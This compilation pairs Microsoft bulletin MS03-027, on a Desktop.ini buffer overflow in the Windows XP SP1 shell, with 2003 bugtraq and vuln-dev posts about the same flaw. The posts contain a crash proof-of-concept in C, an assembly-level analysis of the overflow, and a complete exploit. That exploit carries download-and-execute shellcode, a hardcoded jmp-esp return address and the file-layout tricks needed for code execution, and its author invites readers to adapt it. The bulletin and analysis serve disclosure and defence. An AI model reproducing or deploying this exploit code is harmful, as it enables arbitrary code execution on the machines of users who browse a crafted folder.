=== Content from docs.microsoft.com_933cc2bf_20250125_062710.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2003/ms03-027.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 03/01/2023
* 6 contributors

Feedback

## In this article

Security Bulletin

# Microsoft Security Bulletin MS03-027 - Important

## Unchecked Buffer in Windows Shell Could Enable System Compromise (821557)

Published: July 16, 2003 | Updated: July 17, 2003

**Version:** 1.1

**Originally posted:** July 16, 2003

**Updated:** July 17, 2003

#### Summary

**Who should read this bulletin:**
Customers using MicrosoftÂ® WindowsÂ® XP

**Impact of vulnerability:**
Run code of an attacker's choice

**Maximum Severity Rating:**
Important

**Recommendation:**
Customers should install the patch at the earliest opportunity.

**End User Bulletin:**
An end-user version of this bulletin is available at: [https:](https://)

**Affected Software:**

* Microsoft Windows XP

**Not affected Software:**

* Microsoft Windows Millennium Edition
* Microsoft Windows NTÂ® Server 4.0
* Microsoft Windows NTÂ® 4.0, Terminal Server Edition
* Microsoft Windows 2000
* Microsoft Windows Server 2003

### General Information

## Technical details

**Technical description:**

The Windows shell is responsible for providing the basic framework of the Windows user interface experience. It is most familiar to users as the Windows desktop. It also provides a variety of other functions to help define the user's computing session, including organizing files and folders, and providing the means to start programs.

An unchecked buffer exists in one of the functions used by the Windows shell to extract custom attribute information from certain folders. A security vulnerability results because it is possible for a malicious user to construct an attack that could exploit this flaw and execute code on the user's system.

An attacker could seek to exploit this vulnerability by creating a Desktop.ini file that contains a corrupt custom attribute, and then host it on a network share. If a user were to browse the shared folder where the file was stored, the vulnerability could then be exploited. A successful attack could have the effect of either causing the Windows shell to fail, or causing an attacker's code to run on the user's computer in the security context of the user.

**Mitigating factors:**

* In the case where an attacker's code was executed, the code would run in the security context of the user. As a result, any limitations on the user's ability would also restrict the actions that an attacker's code could take.
* An attacker could only seek to exploit this vulnerability by hosting a malicious file on a share.
* This vulnerability only affects Windows XP Service Pack 1. Users running Windows XP Gold are not affected.

**Severity Rating:**

|  |  |
| --- | --- |
| **Windows XP** | Important |

The above [assessment](https://go.microsoft.com/fwlink/?linkid=21140) is based on the types of systems affected by the vulnerability, their typical deployment patterns, and the effect that exploiting the vulnerability would have on them.

**Vulnerability identifier:** [CAN-2003-0306](https://cve.mitre.org/cgi-bin/cvename.cgi?name=can-2003-0306)

**Tested Versions:**

Microsoft tested Windows Millennium, Windows NT Server 4.0, Windows NT 4.0 Terminal Server Edition, Windows 2000, Windows XP, and Windows Server 2003 to assess whether they are affected by this vulnerability. Previous versions are no longer [supported](https://go.microsoft.com/fwlink/?linkid=21742), and may or may not be affected by this vulnerability.

## Frequently asked questions

**I am running Windows XP Gold, should I install the patch?**

Customers running Windows XP Gold are not vulnerable to this flaw. However, Microsoft has been made aware that some Windows XP Gold customers who had received a specific hotfix from Product Support Services should install the patch to help ensure their computers are protected.

**How can I tell if my computer has the hotfixes installed?**

To determine if your Windows XP Gold installation is vulnerable, perform the following steps:

1. From the **Start** menu, select **Search**
2. Click **All Files and Folders**
3. Type in Shell32.dll
4. Click **Search**
5. In the right hand pane, right click the Shell32.dll file listed
6. Choose **properties**
7. Click the **Version** tab

If the file version is 6.0.2600.39 or higher, then you should apply the patch.

**What's the scope of the vulnerability?**

This is a [buffer overrun](https://technet.microsoft.com/security/bulletin/glossary)vulnerability. An attacker who successfully exploited the vulnerability could run code of their choice on a user's system. This would enable an attacker to perform any action that the user can perform, within the boundaries set forth by their permission level.

**What causes the vulnerability?**

The vulnerability results because of an unchecked buffer in the component of the Windows shell that automatically reads and applies folder attributes from the Desktop.ini file residing in that folder (if one exists).

**What could this vulnerability enable an attacker to do?**

Successfully exploiting this vulnerability could, in the worst case, enable an attacker to run code of his or her choice on the user's system. Because the Windows shell runs in the context of the user, the attacker's code would also run as the user. Any limitations on the user's ability to delete, add, or modify data or configuration information would also limit the attacker.

**What is a "Desktop.ini" file?**

Desktop.ini files store information about how file folders and their contents are to be displayed when a user browses them. Desktop.ini files are not necessary for a folder to be viewed, and do not exist in every folder. If present in the folder, a Desktop.ini file may contain different information depending on the programs that have accessed that folder. For instance; Microsoft Windows Explorer may use a Desktop.ini file to store the name and location of the icon that represents the folder, the text of tool tips to be displayed when the mouse pointer briefly rests over the folder, or how files contained by the folder are to be displayed.

**How could an attacker exploit this vulnerability?**

An attacker could seek to exploit this vulnerability by creating a Desktop.ini file that contains a corrupt attribute and hosting it on a network or Internet share. The attacker could then attempt to lure users to that share.

**What is the Windows shell?**

The Windows shell provides the basic framework for the Windows user interface and is most commonly experienced as the Windows desktop. The shell provides many functions beyond just the desktop and works to present a consistent look and feel throughout the computing experience. The shell can be used to locate files and folders through Windows Explorer, it can be used to provide a consistent way to start programs through shortcuts on the Start menu, and it can be used to provide a consistent interface through desktop themes and colors.

**How does the Windows shell process these file attributes?**

The Windows shell is responsible for various actions associated with displaying information about files, folders, and icons. For example, the ability to change the folder view to show thumbnail pictures of files on a computer is provided by the Windows shell. When a folder is opened on a computer that is set to display folder contents as thumbnails, the Windows shell is engaged. It automatically detects this setting, and then it displays the contents of the folder as thumbnails.

**What is a thumbnail?**

In general, a thumbnail is a greatly-reduced version of an image that contains just enough detail for the image to be recognizable. Thumbnails are often used in a gallery view to allow the user to browse and select from a collection of images.

**What is wrong with the Windows shell?**

The function that allows the Windows shell to automatically extract the display attributes of files and folders contains an unchecked buffer. A buffer overrun can result if the Windows shell attempts to read a corrupt attribute from a Desktop.ini file.

**How is the Windows shell invoked to read file or folder attributes?**

The specific function that contains the unchecked buffer is invoked only when the Windows shell attempts to parse the Desktop.ini file for the custom attributes it needs to apply to a folder and its contents. This function is invoked when a folder is opened.

**Is it possible for an attacker to exploit this vulnerability directly by using e-mail?**

No. A user must browse to a share containing the specially-crafted deskop.ini file for this vulnerability to be exploited.

**I'm not using Windows XP. Could I be affected by the vulnerability?**

No. The flaw is only present in Windows XP Service Pack 1. It does not affect Windows XP Gold or any other version of Windows.

**Is there a safe way to delete a file that I suspect might have been created to exploit the vulnerability?**

If you suspect that you may have downloaded a Desktop.ini file to your computer that has a corrupt custom attribute, do not attempt to delete the file through Windows Explorer. Opening a folder that contains the file will cause the Windows shell to process it and the vulnerable code to be run. Use the command prompt to remove the corrupt file. To access the command prompt, following these steps:

1. Click Start,and then click Run.
2. In the Open box, type cmd.exe, and then click OK. Command prompt will start.
3. Use the DEL command to specify the path to the file and delete it. For specific information on which switches to use, type DEL /? for help.

**What does the patch do?**

The patch addresses the vulnerability by imposing proper input validation on the affected Windows shell function.

## Patch availability

**Download locations for this patch**

* [Microsoft Windows XP 32 bit Edition](https://www.microsoft.com/download/details.aspx?familyid=27d02af5-a2e1-4e25-9d16-502886161a35&displaylang;=en)
* [Microsoft Windows XP 64 bit Edition](https://www.microsoft.com/download/details.aspx?familyid=4ba84e2b-49f9-4416-8745-51f03503ab7d&displaylang;=en)

#### Additional information about this patch

**Installation platforms:**

This patch can be installed on systems running Windows XP [Service Pack 1](https://technet.microsoft.com/windowsxp/bb410118.aspx).

**Inclusion in future service packs:**

The fix for this issue will be included Windows XP Service Pack 2.

**Reboot needed:** Yes

**Patch can be uninstalled:** Yes

**Superseded patches:** None.

**Verifying patch installation:**

* To verify that the patch has been installed on the machine, confirm that the following registry key has been created on the machine:

  HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP2\KB821557
* To verify the individual files, use the date/time and version information provided in the following registry key:

  HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP2\KB821557\Filelist

**Caveats:**

None

**Localization:**

Localized versions of this patch are available at the locations discussed in "Patch Availability".

**Obtaining other security patches:**

Patches for other security issues are available from the following locations:

* Security patches are available from the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129), and can be most easily found by doing a keyword search for "security\_patch".
* Patches for consumer platforms are available from the [WindowsUpdate](https://windowsupdate.microsoft.com/) site

#### Other information:

**Support:**

* Microsoft Knowledge Base article [821557](https://support.microsoft.com/default.aspx?scid=kb;%5bln%5d;821557)discusses this issue and will be available approximately 24 hours after the release of this bulletin. Knowledge Base articles can be found on the [Microsoft Online Support](https://support.microsoft.com/?scid=fh;en-us;kbhowto) site.
* Technical support is available from [Microsoft Product Support Services](https://support.microsoft.com/directory/question.asp?sd=gn&fr;=0). There is no charge for support calls associated with security patches.

**Security Resources:** The [Microsoft TechNet Security](https://www.microsoft.com/technet/security/default.mspx) Web Site provides additional information about security in Microsoft products.

**Disclaimer:**

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

**Revisions:**

* V1.0 (July 16, 2003): Bulletin published.
* V1.1 (July 17, 2003): Corrected CVE Candidate number, added Windows XP Gold information to the Frequently Asked Questions section.

*Built at 2014-04-18T13:49:36Z-07:00*
</https:>

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from marc.info_ed30ac04_20250125_062709.html ===

```
[[prev in list](?l=vuln-dev&m=105226254322182&w=2)] [[next in list](?l=vuln-dev&m=105249787607932&w=2)] [prev in thread] [[next in thread](?l=vuln-dev&m=105249807108136&w=2)]
List:       [vuln-dev](?l=vuln-dev&r=1&w=2)
Subject:    [Buffer overflow in Explorer.exe](?t=105241042700002&r=1&w=2)
From:       ["aT4r InsaN3" <at4r () hotmail ! com>](?a=105155832200003&r=1&w=2)
Date:       [2003-05-07 20:53:50](?l=vuln-dev&r=1&w=2&b=200305)
[Download RAW [message](?l=vuln-dev&m=105241032526289&q=mbox) or [body](?l=vuln-dev&m=105241032526289&q=raw)]

This bug allow a malicious an attacker to execute data with privileges of a
user that is browsing the hard disk with explorer.

tested against winxp SP1

example code provided.

/*

	Buffer Overflow in explorer.exe - Proof of Concept
	Tested only against: Windows XP SP1

	Found by aT4r@3wdesign.es

	Saludos a:
	- #Haxorcitos@efnet= { "Tarako", "Croulder", "Drakar" , "[back]", "tyr" }:
	- #localhost and #darknet

	Usage: just execute this file.
		This code will crash your explorer every time you try to browse your
harddisk
		execute this program again to delete the evil file ;-)

	(3ec.464): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00410041 ebx=0012aca8 ecx=77e5e1c4 edx=002f0000 esi=00121b70
edi=000ece90
	eip=00410041 esp=0177dfb0 ebp=00410041 iopl=0         nv up ei pl zr na po
nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000
efl=00010246
	00410041 ??               ???

	3W Design Security 2003.	<http://www.3WDesign.es/>
*/

#include <direct.h>
#include <stdio.h>
#include <windows.h>
#include <sys/stat.h>

#define BUFF 2300
void main(){

	char path[256];
	char evil[BUFF+1]="";
	FILE *bof;
	struct stat st;
	printf("\n . .. ...: \tBuffer overflow in explorer.exe\t\t:... .. .\n . ..
...: \tProof of Concept (aT4r@3wdesign.es)\t:... .. .\n\n");
	strcpy(path,"\\aT4r[at]3WDesign.es Security");
	mkdir(path);
	SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);

	strcat(path,"\\desktop.ini");
	if (stat(path,&st)==0)
		{ remove(path);	exit(1);}//just execute this program twice to remote this
file :P
	bof=fopen(path,"w");
	fputs("[.ShellClassInfo]\n",bof);
	memset(evil,'A',BUFF);
	fputs(evil,bof);
	fclose(bof);
	printf("evil file: %s Created. Try to browse your Harddisk O:-)\n",path);

}

_________________________________________________________________
Hipotecas para todos los bolsillos con MSN Money.
<http://money.msn.es/hipotecas/default.asp>

[["explorerbof.exe" (application/octet-stream)]](?l=vuln-dev&m=105241032526289&q=p3)

[[prev in list](?l=vuln-dev&m=105226254322182&w=2)] [[next in list](?l=vuln-dev&m=105249787607932&w=2)] [prev in thread] [[next in thread](?l=vuln-dev&m=105249807108136&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_50e2bf25_20250125_062708.html ===

```
[[prev in list](?l=bugtraq&m=105275449806212&w=2)] [[next in list](?l=bugtraq&m=105284851831232&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105292747306966&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Detailed analysis: Buffer overflow in Explorer.exe on Windows XP SP1](?t=105284491400005&r=1&w=2)
From:       ["Executable Security" <exurity () rogers ! com>](?a=105284500600003&r=1&w=2)
Date:       [2003-05-11 8:28:54](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105284486526310&q=mbox) or [body](?l=bugtraq&m=105284486526310&q=raw)]

Hi, there:

We were able to duplicate what was reported by Kristopher Matthews and aT4r
InsaN3. Actually, if you have the following test scenario:

File/Dir				Explanation
C:\
C:\temp\desktop.ini		Overflowing text file
C:\test				directory

The c:\temp\desktop.ini is the buffer-overflowing text file. Then, it
crashes not only Explorer.exe, but also Internet Explorer.exe, and
application programs (it crashed UltraEdit) that use file-open dialog box
trying to scan the c:\ hard drive. However, you can do the following safely
from a DOS prompt for the directory c:\test

Explorer c:\test

Of course, you cannot browse C:\test from the Explorer.exe GUI starting with
C:\ root directory because of the overflowing c:\temp\desktop.ini file.
Actually, I assume the overflowing file, no matter where it is located in
the subdirectory, will crash the Explorer.exe starting with any directory
higher above the overflowing desktop.ini file. (did not fully test though).

Down to the assembly level, this bug lies in the shell32.dll file as such:

7740F3C3                 lea     eax, [ebp-21Ch]		; full path to the
filename \desktop.in
7740F3C9                 push    eax
7740F3CA                 push    800h			; should be 400h I believe
7740F3CF                 lea     eax, [ebp-0A1Ch]
7740F3D5                 push    eax
7740F3D6                 push    offset a_shellclassinf ; ".ShellClassInfo"
7740F3DB                 call    ds:GetPrivateProfileSectionW

When GetPrivateProfileSectionW is called, it assumes the buffer to be as
large as two times of 800h. As you can see, the local buffer is only A1C -
21C = 800H for this string. So, it overflows if the desktop.ini contains a
long string. MSDN documents the third parameter for GetPrivateProfileSection
as such:

nSize
Specifies the size, in characters, of the buffer pointed to by the
lpReturnedString parameter.

To be precise, the buffer overflowing structure for this bug is such:

| --------------------- A1C ---------| EBP | RET | -----------------> higher
address

The replaceable RET address is located at (A1C+4)/2 = 510.

Due to the size limitation set by the 800H as well as the fact that the
overflowing string is converted to Unicode, the chance for executing a
malicious code (Unicode exploit code as well as exploitable RET address) is
very limited. That is the reason we are documenting it in details here.

We do not know how this bug affects shell32.dll files on other Windows
versions.

With due credits to those who wrote the emails quoted below.

Peter Huang
<http://members.rogers.com/exurity/>

-----Original Message-----
From: Kristopher Matthews [mailto:krism@mailsnare.net]
Sent: Friday, May 09, 2003 11:43 AM
To: 'Ryan Yagatich'
Cc: vuln-dev@securityfocus.com
Subject: RE: Buffer overflow in Explorer.exe

I have tested and duplicated this behavior on a fully patched/updated
Windows XP Pro system.

1. The overflow is for that particular key, AFAICT.
1a. It will not work for the root (c:/) directory; explorer.exe does not
parse 'desktop.ini' for that directory. It will, however, work for any other
directory.
2. It crashes explorer.exe (which runs the task bar/start menu, etc) - It
looks for all the world like a standard buffer overflow; I believe a more
carefully crafted 'desktop.ini' file could be cause for explorer.exe to
unintentionally execute arbitrary code.
3. Download and execute untrusted code? Combine this with any of the other
popular expoloits for windows; also, it wouldn't be terribly hard to get a
user to download a 'desktop.ini' file to their "My Documents" directory (in
the guise, of, say, a folder them, which windows does support; e.g.
different background, file layout, etc); bam, whenever they open that
directory, explorer crashes.

Regards,
Kristopher

-----Original Message-----
From: Ryan Yagatich [mailto:ryany@pantek.com]
Sent: Thursday, May 08, 2003 6:28 PM
To: at4r@3wdesign.es
Cc: vuln-dev@securityfocus.com

Hi,
        I don't quite understand the purpose behind this code. It creates
a read only file '/aT4r[at]3WDesign.es Security/desktop.ini' with the
contents of

[.ShellClassInfo]
AAAAAAAAAAAA {x2301}

        And then terminates? I don't have a windows machine available to
really explore this any, but what makes that entry in desktop.ini cause
this? Furthermore, is this issue only for that particular key or is it
generally just key/excessive parameter/missing value size that is
affected? And additionally, you mention that explorer will no longer be
able to operate when trying to browse the hard disk, but does this mean
globally, or when they try to browse the c:/ drive, or just that
particular folder?
        Please send me more information about this, (even if it references
past posts that I have missed) so that I can better understand the
severity of this. Espcially since to me, I still see it as someone needing
to download and execute untrusted software which causes a system crash,
and if that were going to happen there are far worse things that can be
done besides creating a small text file.

Thanks,
Ryan Yagatich

,_____________________________________________________,
\ Ryan Yagatich                     support@pantek.com \
/ Pantek Incorporated                  (877) LINUX-FIX /
\ <http://www.pantek.com/security>        (440) 519-1802 \
/       Are your networks secure? Are you certain?     /
\___E8354282324E636DB5FF7B8A6EDED51FD02C06C68D3DB695___\

On Wed, 7 May 2003, aT4r InsaN3 wrote:

>This bug allow a malicious an attacker to execute data with privileges of a

>user that is browsing the hard disk with explorer.
>
>tested against winxp SP1
>
>example code provided.
>
<snip>
>
>       strcpy(path,"\\aT4r[at]3WDesign.es Security");
>       mkdir(path);
>       SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);
>
>       strcat(path,"\\desktop.ini");

>       bof=fopen(path,"w");
>       fputs("[.ShellClassInfo]\n",bof);
>       memset(evil,'A',BUFF);
>       fputs(evil,bof);
>       fclose(bof);
<snip>

-----Original Message-----
From: aT4r InsaN3 [mailto:at4r@hotmail.com]
Sent: Wednesday, May 07, 2003 3:54 PM
To: vuln-dev@securityfocus.com
Subject: Buffer overflow in Explorer.exe

This bug allow a malicious an attacker to execute data with privileges of a
user that is browsing the hard disk with explorer.

tested against winxp SP1

example code provided.

/*

        Buffer Overflow in explorer.exe - Proof of Concept
        Tested only against: Windows XP SP1

        Found by aT4r@3wdesign.es

        Saludos a:
        - #Haxorcitos@efnet= { "Tarako", "Croulder", "Drakar" , "[back]",
"tyr" }:
        - #localhost and #darknet

        Usage: just execute this file.
                This code will crash your explorer every time you try to
browse your
harddisk
                execute this program again to delete the evil file ;-)

        (3ec.464): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=00410041 ebx=0012aca8 ecx=77e5e1c4 edx=002f0000 esi=00121b70
edi=000ece90
        eip=00410041 esp=0177dfb0 ebp=00410041 iopl=0         nv up ei pl zr
na po
nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000
efl=00010246
        00410041 ??               ???

        3W Design Security 2003.        <http://www.3WDesign.es/>
*/

#include <direct.h>
#include <stdio.h>
#include <windows.h>
#include <sys/stat.h>

#define BUFF 2300
void main(){

        char path[256];
        char evil[BUFF+1]="";
        FILE *bof;
        struct stat st;
        printf("\n . .. ...: \tBuffer overflow in explorer.exe\t\t:... ..
.\n . ..
...: \tProof of Concept (aT4r@3wdesign.es)\t:... .. .\n\n");
        strcpy(path,"\\aT4r[at]3WDesign.es Security");
        mkdir(path);
        SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);

        strcat(path,"\\desktop.ini");
        if (stat(path,&st)==0)
                { remove(path); exit(1);}//just execute this program twice
to remote this
file :P
        bof=fopen(path,"w");
        fputs("[.ShellClassInfo]\n",bof);
        memset(evil,'A',BUFF);
        fputs(evil,bof);
        fclose(bof);
        printf("evil file: %s Created. Try to browse your Harddisk
O:-)\n",path);

}

_________________________________________________________________
Hipotecas para todos los bolsillos con MSN Money.
<http://money.msn.es/hipotecas/default.asp>

[[prev in list](?l=bugtraq&m=105275449806212&w=2)] [[next in list](?l=bugtraq&m=105284851831232&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105292747306966&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_712f7f74_20250125_062708.html ===

```
[[prev in list](?l=bugtraq&m=105301643229010&w=2)] [[next in list](?l=bugtraq&m=105301825530988&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Re[2]: EXPLOIT: Buffer overflow in Explorer.exe on Windows XP SP1
From:       ["einstein, dhtm" <einstein_dhtm () front ! ru>](?a=105068752500004&r=1&w=2)
Date:       [2003-05-15 14:45:20](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105301349925036&q=mbox) or [body](?l=bugtraq&m=105301349925036&q=raw)]

hello bugtraq,

From MSDN:
---cut---
DWORD GetPrivateProfileSection(
  LPCTSTR lpAppName,
  LPTSTR lpReturnedString,
  DWORD nSize,
  LPCTSTR lpFileName
);
[skip]
nSize
[in] Size of the buffer pointed to by the lpReturnedString parameter, in TCHARs.
Windows 95/98/Me: The maximum buffer size is 32,767 characters.
---cut---

It's a pity that even own Microsoft programmers do not know that for
the unicode version of the function TCHAR will turn into a WCHAR.
And we speak about using unicode everywhere..

Here is an exploit for Windows XP Service Pack 1.
NOTE: the FFFE header which can be easily created with notepad is not
a new technique. It has been already used for another vulnerability in
IE (see <http://security.nnov.ru/search/news.asp?binid=1782>).
NOTE: the directory "domain HELL team" has to be read-only, otherwise
it won't work.
NOTE: it's possible to exploit this bug using a network shared
resource. It looks strange, but that doesn't work for samba shares.
P.S. don't blame me i didn't use argv[] for parameters. it's your
task to modify the source..

#include <fstream.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <direct.h>

char shellcode[]=
//download url and exec shellcode
//doesn't have any hardcoded values
//except the base address of the program
//searches the import table for
//LoadLibraryA, GetProcAddress and ExitProcess.
//by .einstein., dH team.
  "\x81\xec\x40\x1f\x00\x00\xe8\x00\x00\x00\x00\x5d\x83\xed\x0b\xbf\x61\x57"
  "\x7a\x74\xe8\x8c\x00\x00\x00\x89\xbd\x17\x01\x00\x00\xbf\x65\x1d\x22\x74"
  "\xe8\x7c\x00\x00\x00\x89\xbd\x1b\x01\x00\x00\xbf\x17\x75\x79\x70\xe8\x6c"
  "\x00\x00\x00\x89\xbd\x1f\x01\x00\x00\x8d\x85\x2c\x01\x00\x00\x50\x2e\xff"
  "\x95\x17\x01\x00\x00\x8d\x9d\x33\x01\x00\x00\x53\x50\x2e\xff\x95\x1b\x01"
  "\x00\x00\x6a\x00\x6a\x00\x8d\x8d\x4e\x01\x00\x00\x51\x8d\x8d\x5c\x01\x00"
  "\x00\x51\x6a\x00\xff\xd0\x8d\x85\x23\x01\x00\x00\x50\x2e\xff\x95\x17\x01"
  "\x00\x00\x8d\x9d\x46\x01\x00\x00\x53\x50\x2e\x8b\x9d\x1b\x01\x00\x00\xff"
  "\xd3\x6a\x01\x8d\x8d\x4e\x01\x00\x00\x51\xff\xd0\x6a\x00\x2e\xff\x95\x1f"
  "\x01\x00\x00\xbb\x3c\x00\x00\x01\x8b\x0b\x81\xc1\x04\x00\x00\x01\x8d\x41"
  "\x14\x8b\x70\x68\x81\xc6\x00\x00\x00\x01\x8b\x06\x83\xf8\x00\x74\x51\x05"
  "\x00\x00\x00\x01\x8b\x56\x10\x81\xc2\x00\x00\x00\x01\x8b\x18\x8b\xcb\x81"
  "\xe1\x00\x00\x00\x80\x83\xf9\x00\x75\x2a\x81\xc3\x00\x00\x00\x01\x83\xc3"
  "\x02\x33\xc9\x32\x0b\xc1\xc1\x08\x43\x80\x3b\x00\x75\xf5\x3b\xcf\x75\x04"
  "\x8b\x3a\xeb\x16\x83\xc2\x04\x83\xc0\x04\x66\x83\x38\x00\x75\xc7\x83\xc6"
  "\x14\x8b\x10\x83\xfa\x00\x74\xa8\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x55\x52\x4c\x4d\x4f\x4e"
  "\x00\x55\x52\x4c\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x54\x6f\x46\x69\x6c\x65"
  "\x41\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x5c\x7e\x57\x52\x46\x35\x36\x33"
  "\x34\x2e\x74\x6d\x70\x00";

char unicode_header[] = "\xFF\xFE";
char shell_header[] = "[.ShellClassInfo]\x0d\x0a";

#define OVERFLOW_LEN 0xA1C

void main()
{
  char url[]="file://c:/winnt/system32/calc.exe";
 // char url[]="<http://localhost/cmd.exe>";
  char eip[] = "\xcc\x59\xfb\x77"; //0x77fb59cc - WinXP SP1 ntdll.dll (jmp esp)

  char path[500];
  strcpy(path,"domain HELL team");
  mkdir(path);
  SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);
  strcat(path,"\\desktop.ini");

  ofstream out(path,ios::out+ios::binary);
  out.write(unicode_header,sizeof(unicode_header)-1);
  char zero = 0;
  for (int i=0;i<strlen(shell_header);i++)
  {
    out.write(&shell_header[i],1);
    out.write(&zero,1);
  }
  char pad = 'B';
  for (i=0;i<OVERFLOW_LEN;i++) out.write(&pad,1);
  char ebp[] = "1234";
  out.write(ebp,4);

  char pad0 = 1;

  out.write(eip,4);

  char pad2 = 'C';
  for (i=0;i<12;i++) out.write(&pad,1);

  out.write(shellcode,sizeof(shellcode)-1);
  out.write(url,sizeof(url));

  int len = sizeof(shellcode)-1+sizeof(url);
  printf("shellcode+url: %d bytes\n",len);
  if (len%2 == 1)
  {
    printf("it's odd, so add 1 extra byte");
    out.write(&pad2,1);
  }

  out.close();

}

.einstein.
domain HELL team.

ES> Hi:

>> -----Original Message-----
>> From: nesumin [mailto:nesumin@softhome.net]

>> I could create the exploit code on my Japanese Windows XP SP1.
>> Perhaps, I think you can easily create the full exploit code
>> by the following;
>>
>> * You can directly specify all overwritten data without thinking
>>   the UNICODE conversion if you create the "desktop.ini" as "UTF-16".
>>   (Adding BOM and encoding "[.ShellClassInfo]\x0d\x0a".)
>>
>> * You can get the code area of about 0xFF4 bytes.
>>   (Before and after RET address)

ES> Obviously, I was playing in the ANSI world. Yes, I agree with you that the
ES> exploit code written in RTF-16 can be created with a size of about 0xFF4
ES> bytes. A piece of 0xFF4 bytes long exploit code can do a lot. So, my
ES> previous statement about limited exploitation of this buffer overflow is not
ES> accurate.

ES> It should be very easy to fix this bug. I manually modified the 800H to 400h
ES> in shell32.dll to fix it.

ES> Thanks a lot for your mention of BOM and UTF-16. Your concept is learnt and
ES> programmatically reproduced with GetPrivateProfileSectionW.

ES> Best regards

ES> Peter Huang

[[prev in list](?l=bugtraq&m=105301643229010&w=2)] [[next in list](?l=bugtraq&m=105301825530988&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


